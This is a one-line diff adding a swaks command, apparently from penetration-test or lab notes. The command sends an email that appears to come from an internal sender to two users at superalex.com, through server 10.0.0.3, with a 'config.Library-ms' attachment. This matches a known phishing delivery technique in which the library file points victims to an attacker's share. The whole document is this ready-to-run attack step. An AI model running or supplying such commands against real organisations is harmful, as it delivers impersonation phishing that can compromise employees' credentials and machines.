@@ -1,0 +1,1 @@
+sudo swaks -t daniela@superalex.com -t marcus@superalex.com --from john@superalex.com --attach @config.Library-ms --server 10.0.0.3 --body @body.txt --header "Subject: Script" --suppress-data -ap
